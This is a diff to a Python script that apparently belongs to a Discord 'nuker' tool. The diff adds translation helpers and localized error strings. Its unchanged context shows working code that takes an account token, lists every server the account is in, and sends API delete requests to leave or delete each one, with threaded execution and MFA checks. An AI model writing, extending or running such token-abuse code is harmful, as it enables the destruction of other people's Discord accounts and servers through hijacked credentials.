@@ -1,5 +1,12 @@
 from Config.Util import *
 from Config.Config import *
+from Config.Translates import *
+
+current_language = LANGUAGE
+
+def tr(key):
+    return translations[current_language].get(key, key)
+
 try:
     import requests
     import threading
@@ -26,12 +33,12 @@ try:
                     requests.delete(f'https://discord.com/api/v8/guilds/'+guild['id'], headers={'Authorization': token})
                     print(f"{invalid}[{secondary}{current_time_hour()}{invalid}] {ADD} Status: {color.WHITE}Leave{color.RED} | Server: {color.WHITE}{guild['name']}")
                 else:
-                    print(f"{invalid}[{secondary}{current_time_hour()}{invalid}] {ERROR} Status: {color.WHITE}Error{color.RED} | Server: {color.WHITE}{guild['name']}")
+                    print(f"{invalid}[{secondary}{current_time_hour()}{invalid}] {ERROR} Status: {color.WHITE}{tr('Error')}{color.RED} | Server: {color.WHITE}{guild['name']}")
             except Exception as e:
-                print(f"{invalid}[{secondary}{current_time_hour()}{invalid}] {ERROR} Status: {color.WHITE}Error: {e}{color.RED}")
+                print(f"{invalid}[{secondary}{current_time_hour()}{invalid}] {ERROR} Status: {color.WHITE}{tr('Error')} {e}{color.RED}")
 
     if token.startswith("mfa."):
-        print(f"{invalid}[{secondary}{current_time_hour()}{invalid}] {ERROR} Status: {color.WHITE}Error: Mfa enabled{color.RED}")
+        print(f"{invalid}[{secondary}{current_time_hour()}{invalid}] {ERROR} Status: {color.WHITE}{tr('Error')} Mfa enabled{color.RED}")
 
     processes = []
     guilds_id = requests.get("https://discord.com/api/v8/users/@me/guilds", headers={'Authorization': token}).json()
